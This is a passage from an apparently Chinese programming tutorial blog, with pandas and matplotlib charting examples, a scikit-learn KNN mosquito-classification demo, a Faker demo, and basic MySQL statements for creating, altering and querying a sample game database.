punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         <span class="token string">'性别'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">,</span> <span class="token string">'女'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         <span class="token string">'眼镜'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         <span class="token string">'成绩'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># print(grade_df)</span><span class="token comment"># 获取频率分布</span>sex <span class="token operator">=</span> grade_df<span class="token punctuation">[</span><span class="token string">'性别'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>grade_df<span class="token punctuation">[</span><span class="token string">'性别'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sex<span class="token punctuation">)</span><span class="token comment"># 绘制频率分布的饼图</span>sex<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'pie'</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'性别分布频数图'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="柱状图"><a href="#柱状图" class="headerlink" title="柱状图"></a>柱状图</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token keyword">from</span> faker <span class="token keyword">import</span> Faker<span class="token keyword">import</span> random<span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>f <span class="token operator">=</span> Faker<span class="token punctuation">(</span>locale<span class="token operator">=</span><span class="token string">'zh_CN'</span><span class="token punctuation">)</span>class_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1班'</span><span class="token punctuation">,</span><span class="token string">'2班'</span><span class="token punctuation">,</span><span class="token string">'3班'</span><span class="token punctuation">]</span>woman_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    woman_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span><span class="token string">'woman'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'height'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'weight'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'class'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>class_list<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>man_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    man_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span><span class="token string">'man'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'height'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'weight'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'class'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>class_list<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>student_list <span class="token operator">=</span> woman_list <span class="token operator">+</span> man_liststudent_df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>student_list<span class="token punctuation">)</span>weight_mean <span class="token operator">=</span> student_df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'weight'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>weight_mean<span class="token punctuation">)</span><span class="token comment"># 降序排列weight_mean</span>weight_mean <span class="token operator">=</span> weight_mean<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>weight_mean<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="综合案例"><a href="#综合案例" class="headerlink" title="综合案例"></a>综合案例</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> matplotlib<span class="token keyword">from</span> faker <span class="token keyword">import</span> Faker<span class="token keyword">import</span> randomf <span class="token operator">=</span> Faker<span class="token punctuation">(</span>locale<span class="token operator">=</span><span class="token string">'zh_CN'</span><span class="token punctuation">)</span>class_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'1班'</span><span class="token punctuation">,</span><span class="token string">'2班'</span><span class="token punctuation">,</span><span class="token string">'3班'</span><span class="token punctuation">]</span>woman_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    woman_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span><span class="token string">'woman'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'height'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">170</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'weight'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'class'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>class_list<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>man_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    man_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'sex'</span><span class="token punctuation">:</span><span class="token string">'man'</span><span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'height'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'weight'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'class'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>class_list<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>student_list <span class="token operator">=</span> woman_list <span class="token operator">+</span> man_liststudent_df <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data<span class="token operator">=</span>student_list<span class="token punctuation">)</span><span class="token comment"># print(student_df)</span><span class="token comment"># 散点图</span>student_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'scatter'</span><span class="token punctuation">)</span><span class="token comment"># 折线图</span><span class="token comment"># use_index是否要用行索引作为x轴的刻度值</span>student_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'height'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'line'</span><span class="token punctuation">,</span>use_index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token comment"># 柱状图</span>student_df<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'barh'</span><span class="token punctuation">)</span>student_df<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'name'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'weight'</span><span class="token punctuation">,</span>kind<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">)</span><span class="token comment"># 饼图</span><span class="token comment"># 获取班级的频率分布</span>class_count <span class="token operator">=</span> student_df<span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>student_df<span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>class_count<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'pie'</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'班级分布'</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%.2f%%'</span><span class="token punctuation">)</span><span class="token comment"># 绘制岗位的频率分布条形图</span>class_count<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind<span class="token operator">=</span><span class="token string">'bar'</span><span class="token punctuation">,</span> figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'班级频率分布条形图'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="sklearn"><a href="#sklearn" class="headerlink" title="sklearn"></a>sklearn</h1><p>机器学习可以解决一种简单的问题——分类问题，那些数学的原理太过于高深，我也不懂，我就结合网上资料和AI，给你们弄了一个简单的案例，进行说明，相信你们看完这个案例，至少能够解决机器学习中最简单的分类问题。</p><p>机器学习曾经解决过一个经典的问题，对蚊子进行分类</p><p>20 世纪 80 年代，生物学家发现了两种蚊子，并把它们分别命名为库蚊和伊蚊，其中伊蚊会传播多种病原体。</p><p>他们想，能不能根据这两种蚊子翅长和触角长的数据，对新的未知类别的蚊子进行分类。</p><p>这是一个分类问题，目标是根据蚊子的特征（翅长、触角长）对蚊子进行分类。</p><p>机器学习其实就是对各种模型的正确使用，那些数学的原理不懂也影响不大，如果理解原理对选择模型肯定会有帮助，我其实还是尝试去学了一下，确实太难了，但是你至少得了解这个模型大概的算法，适不适合解决这类问题，我一开始尝试了很多模型都不对，然后把锅都扔给模型，抱怨这个模型怎么这么垃圾，这样是不对的。</p><p>上述问题最好的模型是K Nearest Neighbors（KNN 模型），他是一种近邻分类算法，在蚊子的分类问题中，KNN 算法的计算步骤是这样的：</p><p>1）计算未知蚊子与每个已知蚊子特征之间的距离。</p><p>2）选取合适的 K 值，找出距离中前 K 个最小值所对应的已知蚊子。</p><p>3）根据少数服从多数的原则，对新蚊子的类别进行预测。</p><p>未知蚊子与每个已知蚊子的距离在散点图中其实一目了然，大家看看程序预测得准不准吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random  <span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd  <span class="token keyword">import</span> seaborn <span class="token keyword">as</span> sns<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>neighbors <span class="token keyword">import</span> KNeighborsClassifier  <span class="token comment"># 生成库蚊数据  </span>kuwen_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    kuwen_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>                        <span class="token string">"翅长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">2.8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token string">"触角长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">1.8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token string">'类别'</span><span class="token punctuation">:</span><span class="token string">'库蚊'</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 生成伊蚊数据 </span>yiwen_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    yiwen_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>                       <span class="token string">"翅长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">4.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token string">"触角长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token string">"类别"</span><span class="token punctuation">:</span> <span class="token string">"伊蚊"</span><span class="token punctuation">,</span>                     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 生成未知数据（其实是库蚊） </span>unknown_data_kuwen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    unknown_data_kuwen<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>                       <span class="token string">"翅长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">2.8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token string">"触角长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">1.8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token string">"类别"</span><span class="token punctuation">:</span> <span class="token string">"未知"</span><span class="token punctuation">,</span>                     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 生成未知数据（其实是伊蚊） </span>unknown_data_yiwen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    unknown_data_yiwen<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">{</span>                       <span class="token string">"翅长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">4.0</span><span class="token punctuation">,</span> <span class="token number">5.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        <span class="token string">"触角长"</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                       <span class="token string">"类别"</span><span class="token punctuation">:</span> <span class="token string">"未知"</span><span class="token punctuation">,</span>                     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment"># 合并数据  </span>wenzi_data <span class="token operator">=</span> kuwen_data <span class="token operator">+</span> yiwen_data <span class="token operator">+</span>  unknown_data_kuwen <span class="token operator">+</span> unknown_data_yiwen  <span class="token comment"># 创建DataFrame  </span>wenzi_df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>wenzi_data<span class="token punctuation">)</span>    <span class="token comment"># print(wenzi_df)</span>x <span class="token operator">=</span> wenzi_df<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'翅长'</span><span class="token punctuation">,</span> <span class="token string">'触角长'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>valuesy <span class="token operator">=</span> wenzi_df<span class="token punctuation">[</span><span class="token string">'类别'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>values<span class="token comment"># Step2 数据预处理</span><span class="token comment"># 最后 10 个样本为未知样本，其余样本为已知样本</span>train_X <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span>train_Y <span class="token operator">=</span> y<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span>pred_X <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment"># Step3 训练模型</span><span class="token comment"># 在 K 近邻分类器中，K 值通过参数 n_neighbors 设置</span>model <span class="token operator">=</span> KNeighborsClassifier<span class="token punctuation">(</span>n_neighbors<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>train_X<span class="token punctuation">,</span> train_Y<span class="token punctuation">)</span><span class="token comment"># Step4 应用模型</span><span class="token comment"># 应用训练出的模型预测未知蚊子的类别</span>pred_Y <span class="token operator">=</span> model<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>pred_X<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pred_Y<span class="token punctuation">)</span><span class="token comment"># 设置中文字体</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Microsoft YaHei'</span><span class="token comment"># 散点图表示</span>sns<span class="token punctuation">.</span>relplot<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token string">'翅长'</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token string">'触角长'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>wenzi_df <span class="token punctuation">,</span> hue<span class="token operator">=</span><span class="token string">'类别'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="faker"><a href="#faker" class="headerlink" title="faker"></a>faker</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> faker <span class="token keyword">import</span> Fakerf <span class="token operator">=</span> Faker<span class="token punctuation">(</span>locale<span class="token operator">=</span><span class="token string">"zh_CN"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>address<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h2><p><strong>注意：</strong>运行快捷键ctrl+r</p><h3 id="创建和删除数据库"><a href="#创建和删除数据库" class="headerlink" title="创建和删除数据库"></a>创建和删除数据库</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 显示所有数据库show databases;-- 创建数据库（图形界面可以操作）create database game;-- 删除数据库drop database game;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建与删除表"><a href="#创建与删除表" class="headerlink" title="创建与删除表"></a>创建与删除表</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 使用数据库use game;-- 显示所有表show tables;-- 创建用户表create table player(id INT,name VARCHAR(100),level INT,exp INT,-- 十位十进制数，保留两位小数gold DECIMAL(10,2))-- 查看用户表结构DESC player;-- 删除表drop table player;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改表字段"><a href="#修改表字段" class="headerlink" title="修改表字段"></a>修改表字段</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 修改字段类型ALTER TABLE player MODIFY COLUMN exp INT DEFAULT 1;-- 修改字段名ALTER TABLE player RENAME COLUMN name to nick_name;-- 增加一个字段ALTER TABLE player ADD COLUMN last_login DATETIME;-- 删除一个字段ALTER TABLE player DROP COLUMN last_login;DESC player;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据的增删改查"><a href="#数据的增删改查" class="headerlink" title="数据的增删改查"></a>数据的增删改查</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 增INSERT INTO player (id,name) VALUES (1,'张三'),(2,'李四');-- 删DELETE FROM player where id = 1;-- 改UPDATE player SET level = 1 where id = 1;-- 查SELECT * FROM player;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="导入与导出"><a href="#导入与导出" class="headerlink" title="导入与导出"></a>导入与导出</h3><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><p>直接打开mysql Command</p><h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><p>添加Mysql的环境变量，打开系统属性，点击“高级系统设置”，在系统属性窗口中，选择“高级”选项卡并点击“环境变量”。</p><p>我的在C:\Program Files\MySQL\MySQL Server 8.0\bin。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 